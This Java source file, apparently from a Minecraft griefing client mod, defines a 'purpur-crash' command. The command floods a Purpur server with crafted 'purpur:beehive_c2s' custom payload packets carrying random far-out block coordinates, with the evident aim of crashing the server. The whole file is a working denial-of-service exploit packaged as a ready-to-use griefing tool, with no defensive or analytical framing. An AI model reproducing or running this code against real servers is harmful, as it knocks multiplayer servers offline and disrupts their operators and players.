package griefingutils.commands;

import com.mojang.brigadier.arguments.IntegerArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import com.mojang.brigadier.context.CommandContext;
import net.minecraft.command.CommandSource;
import net.minecraft.util.Identifier;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.random.Random;

public class PurpurCrash extends BetterCommand {
    public PurpurCrash() {
        super("purpur-crash", "Sends funny CustomPayloadC2S packets to the server.");
    }

    @Override
    public void build(LiteralArgumentBuilder<CommandSource> builder) {
        builder.then(
            argument("packets", IntegerArgumentType.integer(1))
                .executes(this::run)
        );
    }

    private int run(CommandContext<CommandSource> ctx) {
        int packets = IntegerArgumentType.getInteger(ctx, "packets");
        info("Sending %d packet(s)".formatted(packets));
        Random random = Random.create();
        for (int i = 0; i < packets; i++) {
            sendCustomPayload(new Identifier("purpur", "beehive_c2s"), buf -> {
                long l = new BlockPos(
                    random.nextBetween(-30_000_000, 30_000_000),
                    random.nextBetween(250, 254),
                    random.nextBetween(-30_000_000, 30_000_000)
                ).asLong();
                buf.writeLong(l);
            });
        }
        return SUCCESS;
    }
}
